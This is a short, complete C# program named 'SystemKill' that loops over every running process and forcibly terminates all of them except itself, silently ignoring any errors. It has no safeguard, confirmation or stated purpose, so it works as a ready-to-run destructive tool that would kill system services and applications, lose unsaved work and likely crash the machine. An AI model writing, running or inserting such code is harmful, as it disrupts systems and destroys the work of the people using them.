using System;
using System.Diagnostics;

namespace SystemKill
{
    class Program{
        static void Main(){
            foreach (var p in Process.GetProcesses()){
                try{
                    if (p.ProcessName != "SystemKill")
                         p.Kill(); 
                }catch { }
            }
        }
    }
}
